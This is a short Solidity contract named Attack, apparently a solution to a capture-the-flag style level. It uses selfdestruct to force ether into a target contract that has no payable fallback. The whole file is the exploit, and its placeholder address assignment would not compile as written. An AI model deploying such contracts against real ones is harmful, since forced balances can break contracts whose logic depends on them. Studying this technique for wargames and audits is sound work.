// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    address target_addr = "Instance address";

    function kill() public { // kill the contract and FORCELY send ethers to the target even the target doesn't have payable fallback function.
        selfdestruct(payable(target_addr));
    }

    receive() external payable { // allowing this contract to receive ethers.

    }
}
